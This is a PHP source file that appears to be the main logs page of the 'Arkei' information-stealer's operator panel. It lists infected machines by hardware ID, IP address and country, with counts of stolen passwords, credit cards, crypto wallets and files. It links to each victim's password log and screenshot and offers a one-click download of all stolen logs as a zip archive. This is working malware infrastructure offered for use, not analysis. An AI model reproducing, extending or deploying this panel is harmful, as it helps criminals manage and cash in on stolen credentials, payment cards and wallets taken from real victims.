<?php
/*
	Main Page
*/
session_start();
error_reporting(0);

$pageName = "Logs";

require("app/config.php");

$notice_install_file = FALSE;

if($config["db_server"] == null)
{
	header('Location: http://'. $_SERVER["HTTP_HOST"] .'/install');
	exit(0);
}

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["server_addr"] .'/auth', true, 301 );
	exit(0);
}

if(file_exists("install.php"))
{
	unlink('install.php');
	if(file_exists("install.php"))
		$notice_install_file = TRUE;
}

$action = checkParam($_GET["action"]);
$p = checkParam($_GET["p"]);
$func = checkParam($_GET["func"]);

if($func != null)
{
	switch($func)
	{
		case 'download_all':
			DownloadAll($config["logs_folder"]);
			break;
				
		default:
			break;
	}
}

if(strlen($p) > 6)
{
	header( 'Location: http://'. $config["panel_url"] .'/bots', true, 301 );
}

$d = $p - 1;

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{	
	if($p)
	{	
		$bots = $database->query('SELECT * FROM `logs` ORDER BY `id` DESC LIMIT '. $d .'00, '. $p .'00;');
	}
	else
	{
		$bots = $database->query("SELECT * FROM `logs` ORDER BY `id` DESC LIMIT 100;");
	}
	
	$all_logs = $database->query("SELECT * FROM `stats` WHERE `Name`='all_logs';")->fetch_array();
	$all_files = $database->query("SELECT * FROM `stats` WHERE `Name`='all_files';")->fetch_array();
	$all_errors = $database->query("SELECT * FROM `stats` WHERE `Name`='errors';")->fetch_array();

	$_data = date("d/m/Y");
	$_bots = $database->query("SELECT COUNT(1) FROM `logs`");
	$_b = $_bots->fetch_assoc();
	$_bots_a_sql = $database->query("SELECT * FROM `logs`");
	$_bots_active = 0;
	while ($_bots_a = $_bots_a_sql->fetch_assoc())
	{
		$_bot_last_online = $_bots_a["date"];
		$_last_online_date = explode(' ', $_bot_last_online);
		if($_last_online_date[0] == $_data)
		{
			$_bots_active++;
		}	
	}
}
else
{
	$action = "db_not_connected";
	$all_logs["Value"] = "Error";
	$all_files["Value"] = "Error";
	$all_errors["Value"] = "Error";
	$_bots_active = "Error";
}

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

function DownloadAll($logs_dir)
{
	set_time_limit(0); 
	
	$rootPath = realpath('server/'. $logs_dir .'/');

	$zip = new ZipArchive();
	$zip->open('logs.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);

	$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($rootPath), RecursiveIteratorIterator::LEAVES_ONLY);

	foreach ($files as $name => $file)
	{
		// Skip directories (they would be added automatically)
		if (!$file->isDir())
		{
			// Get real and relative path for current file
			$filePath = $file->getRealPath();
			$relativePath = substr($filePath, strlen($rootPath) + 1);

			// Add current file to archive
			$zip->addFile($filePath, $relativePath);
		}
	}

	// Zip archive will be created only after closing object
	$zip->close();
	
	header("X-Sendfile: 'logs.zip'");
	header('Content-type: application/zip');
	header('Content-Disposition: attachment; filename="logs.zip"');
	header('Content-Length: ' . filesize('logs.zip'));
	readfile('logs.zip');
	unlink('logs.zip');
	header( 'Location: http://'. $config["panel_url"] .'/index', true, 301 );
	exit(0);
}

require("template/header.tmpl.php");

function convertToReadableSize($size)
{
  $base = log($size) / log(1024);
  $suffix = array("", " KB", " MB", " GB", " TB");
  $f_base = floor($base);
  return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base];
}

?>
	
	<div class="container">
		<div class="row">
		<?
		
		switch($action)
		{
			case 'install_success':
			?>
			<div class="c-alert c-alert--success">
				<i class="c-alert__icon fa fa-check-circle"></i> Arkei successful installed! Please, delete install.php file.</div>
			<?
				break;
				
			case 'db_not_connected':
			?>
			<div class="c-alert c-alert--danger">
				<i class="c-alert__icon fa fa-check-circle"></i> Can't connect to MySQL database. Please, check app/config.php file</div>
			<?
				break;
		}
		
		if($notice_install_file)
		{ ?>
			<div class="c-alert c-alert--danger">
				<i class="c-alert__icon fa fa-exclamation-triangle"></i> Please, delete install.php file in main directory!</div>
			<? } 
			
		if(!file_exists('server/'. $config["logs_folder"]))
		{ ?>
			<div class="c-alert c-alert--danger">
				<i class="c-alert__icon fa fa-exclamation-triangle"></i> Directory server/<? echo $config["logs_folder"] ?> does not exist!</div>
			<? } 
		
		?>
		
			<div class="col-sm-6 col-lg-3">
				<div class="c-state">
					<h3 class="c-state__title">All Logs</h3>
					<h4 class="c-state__number"><? echo $all_logs["Value"]; ?></h4>
					<!-- <p class="c-state__status"><a href="">Clear value</a></p> -->
					<span class="c-state__indicator">
						<i class="fa fa-globe"></i>
					</span>
				</div>
			</div>

                <div class="col-sm-6 col-lg-3">
                    <div class="c-state c-state--success">
                        <h3 class="c-state__title">Logs Today</h3>
                        <h4 class="c-state__number"><? echo $_bots_active; ?></h4>
                        <span class="c-state__indicator">
                            <i class="fa fa-calendar"></i>
                        </span>
                    </div>
                </div>

                <div class="col-sm-6 col-lg-3">
                    <div class="c-state c-state--warning">
                        <h3 class="c-state__title">Files</h3>
                        <h4 class="c-state__number"><? echo $all_files["Value"]; ?></h4>
                        <span class="c-state__indicator">
                            <i class="fa fa-cloud-download"></i>
                        </span>
                    </div>
                </div>

                <div class="col-sm-6 col-lg-3">
                    <div class="c-state c-state--danger">
                        <h3 class="c-state__title">Errors</h3>
                        <h4 class="c-state__number"><? echo $all_errors["Value"]; ?></h4>
                        <span class="c-state__indicator">
                            <i class="fa fa-exclamation-triangle"></i>
                        </span>
                    </div>
                </div>
            </div>

            <div class="row u-mb-large">
                <div class="col-sm-12">
                    <table class="c-table u-mb-small">

                        <caption class="c-table__title">Latest Logs
						
						<a class="c-table__title-action" href="/index?func=download_all">
                            <i class="fa fa-cloud-download"></i>
                        </a>
						
						</caption>

                        <thead class="c-table__head c-table__head--slim">
                            <tr class="c-table__row">
								<th class="c-table__cell c-table__cell--head">ID</th>
                              <th class="c-table__cell c-table__cell--head">System</th>
							  <th class="c-table__cell c-table__cell--head">IP Address</th>
                              <th class="c-table__cell c-table__cell--head">Date</th>
							    <th class="c-table__cell c-table__cell--head">Profile</th>
								<th class="c-table__cell c-table__cell--head">Size</th>
                              <th class="c-table__cell c-table__cell--head">Stats</th>
                              <th class="c-table__cell c-table__cell--head">
                                  <span class="u-hidden-visually">Actions</span>
                              </th>
                            </tr>
                        </thead>

                        <tbody>
							<?
							
							while ($bot = $bots->fetch_assoc())
							{
								?>
								<tr class="c-table__cell">
									<td class="c-table__cell"><? echo $bot["id"]; ?></td>
									
									<td class="c-table__cell"><? echo $bot["hwid"]; ?>
										<small class="u-block u-text-mute"><? echo $bot["system"]; ?></small>
									</td>
									
									<td class="c-table__cell"><? echo $bot["ip"]; ?>
										<small class="u-block u-text-mute"><? echo $bot["country"]; ?></small>
									</td>

									<td class="c-table__cell"><? echo substr($bot["date"], 0, 10); ?>
										<small class="u-block u-text-mute"><? echo substr($bot["date"], 11); ?></small>
									</td>
									
									<td class="c-table__cell"><? 
									$profileID = $bot["profile"];
									$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$profileID';")->fetch_array();
					
									echo $profile["Name"];?></td>
									
									<td class="c-table__cell"><? echo convertToReadableSize(filesize('server/'.$config["logs_folder"].'/'. $bot["user"])); ?></td>

									<td class="c-table__cell">Passwords: <? echo $bot["passwords"]; ?> | CC: <? echo $bot["cc"]; ?> | Wallets: <? echo $bot["coins"]; ?> | Files: <? echo $bot["files"]; ?></td>

									<td class="c-table__cell u-text-right">
										
										<div class="c-dropdown dropdown">
                                        <button class="c-btn c-btn--secondary has-dropdown dropdown-toggle" id="dropdownMenuButton1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</button>
                                        
                                        <div class="c-dropdown__menu dropdown-menu" aria-labelledby="dropdownMenuButton1" x-placement="bottom-start" style="position: absolute; transform: translate3d(0px, 39px, 0px); top: 0px; left: 0px; will-change: transform;">
                                            <a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $bot["user"]; ?>">View online</a>
											<a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $bot["user"]; ?>&file=passwords.log">View passwords</a>
											<a class="c-dropdown__item dropdown-item" href="/viewer?log=<? echo $bot["user"]; ?>&file=screenshot.bmp" target="_blank">View screenshot</a>
                                            <a class="c-dropdown__item dropdown-item" href="/server/<? echo $config["logs_folder"]; ?>/<? echo $bot["user"]; ?>">Download</a>
                                            <a class="c-dropdown__item dropdown-item" href="/deleteLog?id=<? echo $bot["id"]; ?>">Delete</a>
                                        </div>
                                    </div>
										
									</td>
								</tr>
								<?
							}
							
							?>  
                        </tbody>
                    </table>

                    <nav class="c-pagination u-justify-between">
					
					<?
					if($p != null)
					{
						$next = $p + 1;
						$past = $p - 1;
					}
					else
					{
						$next = 2;
						$past = null;
					}
				
				?>
                        <a class="c-pagination__control" href="/index?p=<?php echo $past; ?>">
                            <i class="fa fa-caret-left"></i>
                        </a>

                        <p class="c-pagination__counter">Page <? if($p == null) { echo "1"; }else { echo $p; } ?></p>

                        <a class="c-pagination__control" href="/index?p=<?php echo $next; ?>">
                            <i class="fa fa-caret-right"></i>
                        </a>
                    </nav>
                </div>
            </div>
			<script src="js/main.min.js?v=1.4"></script>
        </div>
    </body>
</html>
<? mysqli_close($database); ?>